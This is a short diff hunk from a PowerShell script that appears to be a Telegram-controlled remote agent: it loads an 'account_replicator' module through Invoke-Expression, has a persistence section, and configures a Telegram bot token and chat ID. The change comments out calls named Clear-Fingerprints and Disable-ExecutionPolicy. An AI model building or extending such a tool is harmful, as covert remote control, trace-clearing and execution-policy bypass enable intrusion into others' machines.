@@ -43,8 +43,8 @@ loader -path $path -file "account_replicator" | iex
 $commandlist=@('account_replicator')
 $GLOBAL:joblist=@{}
 #persistence
-Clear-Fingerprints
-Disable-ExecutionPolicy
+#Clear-Fingerprints
+#Disable-ExecutionPolicy
 
 New-MyTelegramConfiguration -ApiToken $ApiToken -ChatID $ChatID
 
